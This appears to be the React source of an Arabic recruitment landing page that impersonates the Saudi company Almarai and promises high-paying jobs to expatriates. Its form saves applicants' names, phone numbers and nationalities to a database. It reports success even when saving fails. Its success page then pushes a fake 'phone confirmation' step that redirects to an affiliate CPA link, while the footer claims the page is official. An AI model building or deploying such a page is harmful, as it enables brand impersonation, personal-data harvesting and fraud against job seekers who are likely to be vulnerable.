import { useState, useEffect } from 'react';
import {
  Truck, Package, Sparkles, TrendingUp, Warehouse, Factory,
  ClipboardCheck, Bike, CheckCircle2, Phone, ShieldCheck,
  Users, DollarSign, MapPin, Clock, ArrowLeft, Star,
  BadgeCheck, Building2, ChevronDown, Loader2,
} from 'lucide-react';
import { supabase } from './supabaseClient';
import { jobs, CPA_URL, type Job } from './data';

const iconMap: Record<string, React.ComponentType<{ className?: string }>> = {
  Truck, Package, Sparkles, TrendingUp, Warehouse, Factory, ClipboardCheck, Bike,
};

type Page = 'landing' | 'success';

export default function App() {
  const [page, setPage] = useState<Page>('landing');
  const [selectedJob, setSelectedJob] = useState<Job | null>(null);
  const [submittedName, setSubmittedName] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');

  const [form, setForm] = useState({
    fullName: '',
    jobTitle: '',
    phone: '',
    nationality: '',
  });

  useEffect(() => {
    if (page === 'success') {
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }, [page]);

  const handleJobSelect = (job: Job) => {
    setSelectedJob(job);
    setForm((f) => ({ ...f, jobTitle: job.title }));
    const el = document.getElementById('application-form');
    el?.scrollIntoView({ behavior: 'smooth', block: 'center' });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    if (!form.fullName.trim() || !form.jobTitle.trim()) {
      setError('يرجى تعبئة الاسم والمهنة');
      return;
    }
    setSubmitting(true);
    try {
      await supabase.from('applications').insert({
        full_name: form.fullName.trim(),
        job_title: form.jobTitle.trim(),
        salary: selectedJob?.salary ?? '',
        nationality: form.nationality.trim() || selectedJob?.nationality || '',
        phone: form.phone.trim(),
      });
    } catch (err) {
      console.error('Supabase insert failed:', err);
    } finally {
      setSubmittedName(form.fullName.trim());
      setPage('success');
      setSubmitting(false);
    }
  };

  if (page === 'success') {
    return <SuccessPage name={submittedName} onBack={() => setPage('landing')} />;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-emerald-50 via-white to-emerald-50/40">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white/90 backdrop-blur-md border-b border-emerald-100 shadow-sm">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-600 to-green-700 flex items-center justify-center shadow-md">
              <Building2 className="w-6 h-6 text-white" />
            </div>
            <div>
              <span className="block text-lg font-extrabold text-emerald-800 leading-tight">المراعي</span>
              <span className="block text-[10px] text-gray-500 leading-tight">توظيف المملكة</span>
            </div>
          </div>
          <a
            href="#application-form"
            className="hidden sm:inline-flex items-center gap-1.5 text-sm font-bold text-emerald-700 bg-emerald-50 hover:bg-emerald-100 px-4 py-2 rounded-full transition-colors"
          >
            قدّم الآن <ArrowLeft className="w-4 h-4" />
          </a>
        </div>
      </header>

      {/* Hero */}
      <section className="relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-br from-emerald-700 via-green-700 to-teal-800" />
        <div className="absolute inset-0 opacity-20" style={{
          backgroundImage: 'radial-gradient(circle at 20% 30%, white 1px, transparent 1px), radial-gradient(circle at 80% 70%, white 1px, transparent 1px)',
          backgroundSize: '40px 40px',
        }} />
        <div className="relative max-w-6xl mx-auto px-4 sm:px-6 py-16 sm:py-24 text-center text-white">
          <div className="inline-flex items-center gap-2 bg-white/15 backdrop-blur-sm border border-white/20 rounded-full px-4 py-1.5 mb-6 animate-fade-in">
            <span className="w-2 h-2 rounded-full bg-green-300 animate-pulse" />
            <span className="text-sm font-semibold">باب التوظيف مفتوح الآن في السعودية</span>
          </div>
          <h1 className="text-3xl sm:text-5xl font-black leading-tight mb-4 animate-fade-in-up">
            شركة المراعي تعيد فتح<br />
            <span className="text-green-200">باب التوظيف</span> في المملكة
          </h1>
          <p className="text-lg sm:text-xl text-emerald-50/90 max-w-2xl mx-auto mb-8 animate-fade-in-up delay-100">
            وظائف متاحة للمغتربين والمقيمين برواتب عالية ومزايا حصرية.
            اختر وظيفتك واملأ النموذج للتقديم فوراً.
          </p>
          <div className="flex flex-wrap items-center justify-center gap-4 sm:gap-8 text-sm animate-fade-in-up delay-200">
            <div className="flex items-center gap-2">
              <DollarSign className="w-5 h-5 text-green-200" />
              <span className="font-semibold">رواتب عالية</span>
            </div>
            <div className="flex items-center gap-2">
              <Users className="w-5 h-5 text-green-200" />
              <span className="font-semibold">للمغتربين والمقيمين</span>
            </div>
            <div className="flex items-center gap-2">
              <MapPin className="w-5 h-5 text-green-200" />
              <span className="font-semibold">جميع مناطق السعودية</span>
            </div>
          </div>
          <a
            href="#jobs"
            className="inline-flex items-center gap-2 mt-10 bg-white text-emerald-800 font-bold px-8 py-3.5 rounded-full shadow-lg hover:shadow-xl hover:scale-105 transition-all animate-fade-in-up delay-300"
          >
            تصفّح الوظائف المتاحة
            <ChevronDown className="w-5 h-5" />
          </a>
        </div>
        <div className="absolute bottom-0 left-0 right-0 h-16 bg-gradient-to-t from-emerald-50 to-transparent" />
      </section>

      {/* Stats bar */}
      <section className="max-w-5xl mx-auto px-4 sm:px-6 -mt-4 relative z-10">
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 bg-white rounded-2xl shadow-xl border border-emerald-100 p-5 sm:p-6">
          {[
            { icon: Users, value: '+500', label: 'وظيفة متاحة' },
            { icon: DollarSign, value: '9,000', label: 'أعلى راتب (ريال)' },
            { icon: MapPin, value: '13', label: 'منطقة في السعودية' },
            { icon: Clock, value: '24 ساعة', label: 'رد على الطلبات' },
          ].map((s, i) => (
            <div key={i} className="text-center">
              <s.icon className="w-6 h-6 text-emerald-600 mx-auto mb-1" />
              <div className="text-xl sm:text-2xl font-black text-gray-800">{s.value}</div>
              <div className="text-xs text-gray-500">{s.label}</div>
            </div>
          ))}
        </div>
      </section>

      {/* Jobs */}
      <section id="jobs" className="max-w-6xl mx-auto px-4 sm:px-6 py-16">
        <div className="text-center mb-10">
          <h2 className="text-2xl sm:text-3xl font-black text-gray-800 mb-2">الوظائف المتاحة</h2>
          <p className="text-gray-500">اختر الوظيفة المناسبة لتقديم طلبك مباشرة</p>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {jobs.map((job, i) => {
            const Icon = iconMap[job.icon] ?? Package;
            const active = selectedJob?.id === job.id;
            return (
              <button
                key={job.id}
                onClick={() => handleJobSelect(job)}
                className={`group text-right p-5 rounded-2xl border-2 transition-all animate-fade-in-up hover:shadow-lg hover:-translate-y-1 ${
                  active
                    ? 'border-emerald-500 bg-emerald-50 shadow-md'
                    : 'border-gray-100 bg-white hover:border-emerald-200'
                }`}
                style={{ animationDelay: `${i * 0.05}s` }}
              >
                <div className="flex items-center justify-between mb-3">
                  <div className={`w-12 h-12 rounded-xl flex items-center justify-center transition-colors ${
                    active ? 'bg-emerald-600' : 'bg-emerald-50 group-hover:bg-emerald-100'
                  }`}>
                    <Icon className={`w-6 h-6 ${active ? 'text-white' : 'text-emerald-600'}`} />
                  </div>
                  {active && <BadgeCheck className="w-5 h-5 text-emerald-600" />}
                </div>
                <h3 className="font-bold text-gray-800 mb-1">{job.title}</h3>
                <div className="flex items-center gap-1 text-sm text-emerald-700 font-semibold mb-1">
                  <DollarSign className="w-3.5 h-3.5" />
                  {job.salary}
                </div>
                <div className="flex items-center gap-1 text-xs text-gray-400">
                  <Users className="w-3.5 h-3.5" />
                  {job.nationality}
                </div>
              </button>
            );
          })}
        </div>
      </section>

      {/* Form */}
      <section id="application-form" className="max-w-2xl mx-auto px-4 sm:px-6 pb-20">
        <div className="bg-white rounded-3xl shadow-xl border border-emerald-100 overflow-hidden">
          <div className="bg-gradient-to-l from-emerald-700 to-green-700 px-6 py-5 text-white">
            <h2 className="text-xl font-black mb-1">قدّم طلبك الآن</h2>
            <p className="text-sm text-emerald-50/80">املأ البيانات التالية وسنتواصل معك في أقرب وقت</p>
          </div>
          <form onSubmit={handleSubmit} className="p-6 space-y-5">
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-1.5">الاسم الكامل</label>
              <input
                type="text"
                value={form.fullName}
                onChange={(e) => setForm({ ...form, fullName: e.target.value })}
                placeholder="أدخل اسمك الكامل"
                className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none transition-all text-right"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-700 mb-1.5">المهنة</label>
              <div className="relative">
                <select
                  value={form.jobTitle}
                  onChange={(e) => {
                    const job = jobs.find((j) => j.title === e.target.value);
                    setSelectedJob(job ?? null);
                    setForm({ ...form, jobTitle: e.target.value });
                  }}
                  className="w-full appearance-none px-4 py-3 pl-10 rounded-xl border-2 border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none transition-all text-right bg-white"
                  required
                >
                  <option value="" disabled>اختر المهنة</option>
                  {jobs.map((j) => (
                    <option key={j.id} value={j.title}>{j.title}</option>
                  ))}
                </select>
                <ChevronDown className="w-5 h-5 text-gray-400 absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none" />
              </div>
              {selectedJob && (
                <div className="mt-2 flex flex-wrap gap-2 text-sm animate-fade-in">
                  <span className="inline-flex items-center gap-1 bg-emerald-50 text-emerald-700 px-3 py-1 rounded-full font-semibold">
                    <DollarSign className="w-3.5 h-3.5" /> {selectedJob.salary}
                  </span>
                  <span className="inline-flex items-center gap-1 bg-blue-50 text-blue-700 px-3 py-1 rounded-full font-semibold">
                    <Users className="w-3.5 h-3.5" /> {selectedJob.nationality}
                  </span>
                </div>
              )}
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-700 mb-1.5">الجنسية (اختياري)</label>
              <input
                type="text"
                value={form.nationality}
                onChange={(e) => setForm({ ...form, nationality: e.target.value })}
                placeholder="مثال: مصرية، سودانية، فلبينية..."
                className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none transition-all text-right"
              />
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-700 mb-1.5">رقم الهاتف (اختياري)</label>
              <input
                type="tel"
                value={form.phone}
                onChange={(e) => setForm({ ...form, phone: e.target.value })}
                placeholder="05xxxxxxxx"
                className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none transition-all text-right"
                dir="ltr"
              />
            </div>

            {error && (
              <div className="bg-red-50 text-red-600 text-sm font-semibold px-4 py-2.5 rounded-xl animate-fade-in">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={submitting}
              className="w-full bg-gradient-to-l from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 text-white font-bold py-4 rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {submitting ? (
                <><Loader2 className="w-5 h-5 animate-spin" /> جاري الإرسال...</>
              ) : (
                <>تقديم الطلب <ArrowLeft className="w-5 h-5" /></>
              )}
            </button>

            <div className="flex items-center justify-center gap-2 text-xs text-gray-400">
              <ShieldCheck className="w-4 h-4" />
              بياناتك آمنة ولن تُشارك مع أي طرف خارجي
            </div>
          </form>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-900 text-gray-400 py-8 px-4 text-center text-sm">
        <p className="mb-1">© 2026 المراعي - التوظيف في المملكة العربية السعودية</p>
        <p className="text-xs text-gray-600">هذه صفحة توظيف رسمية لعرض الوظائف المتاحة</p>
      </footer>
    </div>
  );
}

function SuccessPage({ name, onBack }: { name: string; onBack: () => void }) {
  const [redirecting, setRedirecting] = useState(false);

  const handleConfirm = () => {
    setRedirecting(true);
    setTimeout(() => {
      window.location.href = CPA_URL;
    }, 800);
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-emerald-50 via-white to-emerald-50/40 flex items-center justify-center px-4 py-10">
      <div className="max-w-lg w-full">
        <div className="bg-white rounded-3xl shadow-2xl border border-emerald-100 overflow-hidden animate-fade-in-up">
          {/* Success header */}
          <div className="bg-gradient-to-br from-emerald-600 to-green-700 px-6 py-10 text-center text-white relative overflow-hidden">
            <div className="absolute inset-0 opacity-20" style={{
              backgroundImage: 'radial-gradient(circle at 30% 20%, white 1px, transparent 1px)',
              backgroundSize: '30px 30px',
            }} />
            <div className="relative">
              <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center animate-pulse-glow">
                <CheckCircle2 className="w-12 h-12 text-white" />
              </div>
              <h1 className="text-2xl font-black mb-1">تم استلام طلبك بنجاح!</h1>
              <p className="text-emerald-50/90 text-sm">
                مرحباً {name || 'بك'}، طلبك قيد المراجعة
              </p>
            </div>
          </div>

          {/* Body */}
          <div className="p-6 sm:p-8 text-center">
            <div className="space-y-3 mb-6 text-right">
              {[
                'تم تسجيل بياناتك في نظام التوظيف',
                'سيتم مراجعة طلبك خلال 24 ساعة',
                'سنتواصل معك على الرقم المسجل لدينا',
              ].map((t, i) => (
                <div key={i} className="flex items-center gap-3 bg-emerald-50/60 px-4 py-3 rounded-xl animate-fade-in-up" style={{ animationDelay: `${i * 0.1}s` }}>
                  <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0" />
                  <span className="text-sm text-gray-700 font-medium">{t}</span>
                </div>
              ))}
            </div>

            <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6">
              <div className="flex items-start gap-2 text-right">
                <Phone className="w-5 h-5 text-amber-600 shrink-0 mt-0.5" />
                <div>
                  <p className="text-sm font-bold text-amber-800 mb-0.5">خطوة أخيرة مهمة</p>
                  <p className="text-xs text-amber-700">
                    لتأكيد طلبك وتفعيل رقم هاتفك للتواصل، يرجى الضغط على زر تأكيد الهاتف أدناه.
                  </p>
                </div>
              </div>
            </div>

            <button
              onClick={handleConfirm}
              disabled={redirecting}
              className="w-full bg-gradient-to-l from-emerald-600 to-green-600 hover:from-emerald-700 hover:to-green-700 text-white font-bold py-4 rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-70 flex items-center justify-center gap-2 text-lg"
            >
              {redirecting ? (
                <><Loader2 className="w-5 h-5 animate-spin" /> جاري التحويل...</>
              ) : (
                <><Phone className="w-5 h-5" /> تأكيد رقم الهاتف</>
              )}
            </button>

            <button
              onClick={onBack}
              className="mt-3 text-sm text-gray-400 hover:text-gray-600 transition-colors"
            >
              العودة للصفحة الرئيسية
            </button>

            <div className="flex items-center justify-center gap-1 mt-4 text-xs text-gray-400">
              <ShieldCheck className="w-4 h-4" />
              تأكيد آمن ومشفّر
            </div>
          </div>
        </div>

        <div className="flex items-center justify-center gap-1 mt-4 text-xs text-gray-400">
          <Star className="w-3.5 h-3.5 text-yellow-400 fill-yellow-400" />
          آلاف المتقدمين انضموا هذا الأسبوع
        </div>
      </div>
    </div>
  );
}
